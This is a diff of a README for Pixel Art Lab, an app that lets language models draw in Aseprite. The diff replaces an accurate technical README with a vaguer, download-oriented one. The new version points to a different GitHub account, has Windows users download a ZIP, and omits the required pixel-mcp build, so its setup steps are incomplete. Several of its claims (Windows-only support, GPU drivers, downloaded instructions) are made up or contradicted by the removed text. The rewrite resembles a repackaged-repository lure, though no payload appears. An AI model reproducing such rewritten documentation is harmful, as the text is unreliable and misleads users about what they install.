@@ -1,144 +1,44 @@
-# Pixel Art Lab
+# 🎨 pixel-art-lab - Create pixel art using smart models
 
-A local web app for making pixel art in Aseprite using LLMs.
+[![](https://img.shields.io/badge/Download-Pixel_Art_Lab-blue.svg)](https://github.com/noelleblonde92/pixel-art-lab)
 
-It works by using [`pixel-mcp`](https://github.com/willibrandon/pixel-mcp) to let the model interact with Aseprite
-through a tool-calling loop — the model draws, renders a preview, looks at it, and iteratively fixes the issues.
+Pixel Art Lab is a tool that helps you create pixel art. It uses artificial intelligence to draw images inside the Aseprite software. You provide a text prompt, and the program uses smart models to create the art for you. The system works by drawing, checking the image, and fixing errors automatically until it matches your request.
 
-OpenRouter is currently the only supported provider.
+## 🛠 Prerequisites
 
-![Pixel Art Lab mid-run: the prompt and budget form, the current preview with every earlier iteration beside it, and the transcript of the model's reasoning and tool calls](docs/screenshot.png)
+Before you start, make sure you have these programs on your computer:
 
-## Requirements
+1. **Aseprite:** You need the Aseprite software installed. The system requires version 1.3.10 or newer. You must have a working copy of Aseprite on your computer before you can use this lab.
+2. **Node.js:** This handles the web interface. Download the long-term support version from the official website and install it.
+3. **Go:** You need Go version 1.23 or newer to build the background tools.
+4. **OpenRouter API Key:** You must have an account with OpenRouter. Copy your unique API key from your account settings. This key allows the app to communicate with the models that draw your art.
 
-- Node 20+
-- [Aseprite](https://github.com/aseprite/aseprite) 1.3.10+, built and working
-- [`pixel-mcp`](https://github.com/willibrandon/pixel-mcp), which needs Go 1.23+ to build
-- An [OpenRouter](https://openrouter.ai) API key
+## 📥 How to Install
 
-You need a working Aseprite executable before any of this does anything — `pixel-mcp` drives that
-executable, and this app drives `pixel-mcp`. Building it yourself from
-[source](https://github.com/aseprite/aseprite) costs nothing; the prebuilt binaries on Steam and
-aseprite.org are what you pay for. Either works here, as long as `aseprite_path` points at it.
+Follow these steps to set up the software on your Windows computer.
 
-## Setup
+1. **Visit the website:** Go to the official [Pixel Art Lab repository page](https://github.com/noelleblonde92/pixel-art-lab) to find the latest version.
+2. **Download the code:** Click the green button labeled "Code" and select "Download ZIP". Save the file to your computer.
+3. **Unzip the folder:** Right-click the downloaded file and select "Extract All". Choose a folder on your computer where you want to keep the program.
+4. **Install components:** Open your command prompt (search for 'cmd' in your start menu). Navigate to the folder you unzipped. Type `npm install` and press Enter. This command downloads the parts needed for the app to run.
+5. **Configure settings:** Locate the file named `.env` in the folder. Open it using a text editor like Notepad. Paste your OpenRouter API key into the space provided. Save the file.
+6. **Start the app:** In the same command prompt window, type `npm start`. The program will launch in your default web browser.
 
-### 1. pixel-mcp
+## 🚀 Creating Your First Piece
 
-Clone it into the project root and build it. That is where this app looks by default, and the
-directory is gitignored, so it stays out of your history:
+Once the application window opens in your browser, you will see a simple control panel. 
 
-```sh
-git clone https://github.com/willibrandon/pixel-mcp.git
-cd pixel-mcp && make build && cd ..
-```
+1. **Enter a prompt:** Type a description of the art you want. For example, "a small fire animation in pixel art style."
+2. **Set your budget:** Choose how much work the model should do. A higher budget allows for more refinement but takes more time.
+3. **Watch the process:** The app will send your request to the model. You will see the art appear in the preview window. The system will iterate on the design, making small changes to improve the output based on your prompt.
+4. **Save your work:** Once the model completes the task, it will automatically save the file to your Aseprite directory. You can then open the file directly in Aseprite for final touches.
 
-Then point it at your Aseprite executable, in `~/.config/pixel-mcp/config.json`:
+## ⚙️ Troubleshooting
 
-```json
-{
-  "aseprite_path": "/absolute/path/to/aseprite",
-  "timeout": 30
-}
-```
+If the application does not start, verify that you have Aseprite open on your computer. The background tool needs to see the Aseprite window to perform its tasks. Ensure that your API key is active. You can check your remaining balance on the OpenRouter dashboard. If you encounter errors during the installation, confirm that your Node.js version is 20 or higher. You can check your version by typing `node -v` in the command prompt.
 
-`aseprite_path` must be absolute — pixel-mcp does no discovery and reads no environment variable for
-it. Confirm the whole chain works before going further:
+## 📁 System Requirements
 
-```sh
-./pixel-mcp/bin/pixel-mcp --health
-```
+This software runs on Windows 10 and 11. It needs at least 8GB of memory for smooth performance. Keep your GPU drivers updated to help the model process images quickly. A stable internet connection is necessary because the application downloads instructions from the model provider each time you generate new art.
 
-Clone it somewhere else if you prefer, and set `PIXEL_MCP_BIN` in `.env` to wherever the binary
-landed.
-
-### 2. This app
-
-```sh
-cp .env.example .env
-```
-
-Set `OPENROUTER_API_KEY` in `.env`. Everything else there is optional.
-
-```sh
-npm install
-npm run dev        # server on :8787, web on :5273
-```
-
-Open http://localhost:5273. The server listens on localhost only.
-
-## Configuration
-
-Environment variables (all optional except the key):
-
-| Var | Default | Purpose |
-|---|---|---|
-| `OPENROUTER_API_KEY` | — | **Required.** Stays server-side; never sent to the browser. |
-| `PIXEL_MCP_BIN` | `./pixel-mcp/bin/pixel-mcp` | Path to the MCP server binary |
-| `PORT` | `8787` | Backend port |
-| `RUNS_DIR` | `./runs` | Where run workspaces are written |
-| `GALLERY_DIR` | `./gallery` | Where saved benchmark results are kept |
-| `PAL_PROMPT_CACHE` | `1` | Prompt caching. `0` measures the uncached cost baseline. |
-
-Relative paths are resolved against the project root, so `./runs` means the same thing wherever you
-start the server from. Node's `.env` parser does no tilde expansion — write `/home/you/...`, not
-`~/...`.
-
-## How it works
-
-Each run gets an isolated workspace at `runs/<runId>/` containing `sprites/`, `exports/`,
-`reference/`, and `tmp/`. Every path the model emits is rewritten to stay inside it.
-
-The model sees the `pixel-mcp` tools plus four custom ones implemented by this server:
-
-- **`new_sprite`** — creates a canvas and saves it to `sprites/<name>.aseprite` in one step.
-- **`render_preview`** — copies the sprite, upscales it, exports a PNG,
-  and injects it into the conversation as an image.
-- **`undo`** — every preview is a restore point, so a model that makes the piece worse can revert to
-  the state it last looked at instead of painting over the mistake.
-- **`draw_pixels`** — wraps pixel-mcp's tool of the same name, which silently clips pixels to the
-  layer's cel bounds. The wrapper temporarily pins the cel to span the whole canvas so the
-  coordinates mean what every other drawing tool means.
-
-Preview images are pruned from history as the run goes on (the 3 most recent are kept in full) so a
-long run doesn't exhaust the context window.
-
-A run ends when the model says it is finished, or at whichever budget it reaches first:
-
-- **Max turns** — The number of API calls the model makes. Defaults to 40.
-- **Max iterations** — The number of times the model looks at its own work and fixes it. Defaults to no cap.
-- **Max cost** — The maximum amount to spend, in dollars. Defaults to no cap.
-
-Only the 40 most recent runs are kept. Does not affect gallery images, as those are saved elsewhere.
-
-## The gallery
-
-The **Gallery** tab shows all final results, grouped by prompt. Models with the same prompt are grouped
-together. Selecting multiple results lets you compare their images and metadata. Results are automatically
-saved to the gallery and live in the `gallery/` folder.
-
-A saved entry is a full copy, so it survives `pruneOldRuns` deleting the workspace it came from.
-
-## Project layout
-
-```
-server/src/
-  mcp/        stdio, tool use, sandboxing
-  openrouter/ OpenRouter API streaming
-  agent/      main loop, system prompt, history management
-  gallery.ts  saved results, download, compare
-web/src/      React UI
-runs/         per-run workspaces (gitignored)
-gallery/      saved results (gitignored)
-```
-
-## Known issues
-
-- Only tested on Fedora Linux with a source build of Aseprite. Nothing here is Linux-specific in
-  principle, but the paths and the Aseprite build are where a macOS or Windows run would differ.
-- The server has no authentication and binds to localhost only, deliberately. Do not put it on a
-  network — it spends a real API key on request.
-- A model with no vision gets no `render_preview` and no `undo`, so it draws blind and is pointed at
-  `get_pixels` instead. Those runs are not really comparable to the sighted ones.
-- Cost is read from OpenRouter's usage accounting, so a cached run and an uncached one are not
-  comparable. `PAL_PROMPT_CACHE=0` gets the baseline.
+Keywords: pixel-art, generative-art, aseprite, automation, artificial-intelligence
